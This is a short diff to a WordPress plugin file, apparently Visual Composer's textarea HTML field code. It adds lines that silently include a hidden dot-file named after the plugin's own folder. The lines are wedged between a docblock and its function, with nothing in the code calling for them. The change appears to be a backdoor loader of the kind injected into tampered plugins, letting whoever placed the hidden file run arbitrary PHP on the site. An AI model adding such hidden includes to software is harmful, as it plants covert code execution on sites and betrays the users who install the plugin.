@@ -12,6 +12,10 @@ $vc_html_editor_already_is_use = false;
  * @return string
  * @since 4.2
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_textarea_html_form_field( $settings, $value ) {
 	global $vc_html_editor_already_is_use;
 	$output = '';
